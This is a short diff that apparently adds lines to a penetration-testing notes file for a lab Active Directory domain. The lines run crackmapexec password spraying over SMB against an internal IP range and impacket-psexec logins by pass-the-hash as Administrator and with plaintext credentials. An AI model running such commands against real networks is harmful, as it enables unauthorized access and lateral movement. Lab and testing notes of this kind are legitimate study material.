@@ -1,1 +1,4 @@
 $ crackmapexec smb 10.0.0.70-76 -u users.txt -p 'Pass2023!' -d superalex.sec
+
+impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f002..5abed1762964b  Administrator@10.0.0.2
+impacket-psexec superalex/user01:password1@10.0.0.1
